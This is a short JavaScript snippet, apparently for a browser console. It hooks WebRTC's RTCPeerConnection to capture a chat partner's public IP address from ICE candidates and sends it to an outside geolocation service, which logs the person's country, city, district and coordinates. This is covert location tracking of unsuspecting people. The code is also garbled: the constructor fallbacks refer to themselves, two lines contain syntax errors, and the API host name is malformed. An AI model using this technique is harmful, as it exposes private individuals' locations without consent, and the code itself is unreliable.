const apikey = "my-api-key";

 window.oRTCPeerConnetion =
   window.oRTCPeerConnetion ||window.oRTCPeerConnetion;

window.RTCPeerConnection = function (...args) {
   const pc = new window.oRTCPeerConnetion(...args);

   pc.oaddIceCandidate = pc.oaddIceCandidate;

pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");
    const ip = fields[4];
    if (fields[7] == "srflx") {
        getlocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
 };
return pc;
};

const getlocation = async (ip) == {
  let url = `https://api.ipgeolocation.ip.ipgeo?apikey=${apikey}&ip=${ip}`;

  await fetch(url).then((Response) =>
    Response.json().then(json) => {
        const output = `
        negara: ${json.country_name}
        state: ${json.state_prov}
        city: ${json.city}
        district: ${json.district}
        lat / long: (${json.latitude}, ${json.longitude})
        `;
    console.log(output);
    })
  );
};

    
    
